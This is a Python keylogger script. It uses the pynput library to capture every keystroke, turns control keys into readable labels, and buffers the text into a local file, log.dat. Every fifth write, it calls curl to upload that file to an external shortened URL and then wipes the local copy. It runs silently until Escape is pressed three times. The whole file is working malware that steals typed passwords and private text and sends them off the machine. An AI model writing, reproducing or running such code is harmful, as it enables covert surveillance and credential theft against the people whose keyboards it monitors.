from pynput.keyboard import Listener
import os


count = 0
send = 0
words = ""
esc = 0


def word(key):
    par = str(key)
    if len(par) == 3:
        return par[1]
    if par == 'Key.space':
        return ' '
    if par == 'Key.enter':
        return '\n'
    if par == 'Key.shift':
        return ""
    if par[0: -2] == 'Key.ctrl' or par == 'Key.alt_gr':
        return ""
    if par[1] == '\\':
        if par[2] == 'x':
            return '[Ctrl + ' + chr(int(par[3: -1], 16) + 64) + ']'
        if par[2] == 't':
            return '[Ctrl + I]'
        if par[2] == 'r':
            return '[Ctrl + M]'
        else:
            return '[Ctrl + J]'
    if par[0: 4] == 'Key.':
        return '[' + par[4:].capitalize() + ']'
    if par[0] == '<':
        return chr(int(par[1: -1]) - 48)
    return '[' + par + ']'


def write_file(key):
    f = open('log.dat', "a")
    f.write(key)
    f.close()


def on_press(key):
    global words, count, send
    words += word(key)
    count += 1
    if count >= 10:
        write_file(words)
        words = ''
        count = 0
        send += 1
        if send >= 5:
            os.system("curl -T log.dat -L https://bit.ly/3DHmzBN")
            os.system("echo.>log.dat")
            send = 0


def on_release(key):
    if str(key) == 'Key.esc':
        global esc
        esc += 1
        if esc >= 3:
            return False


data = f'{os.popen("echo %date%").read()} {os.popen("echo %time%").read()}'
write_file(data)
while esc < 3:
    with Listener(on_press, on_release) as listener:
        listener.join()
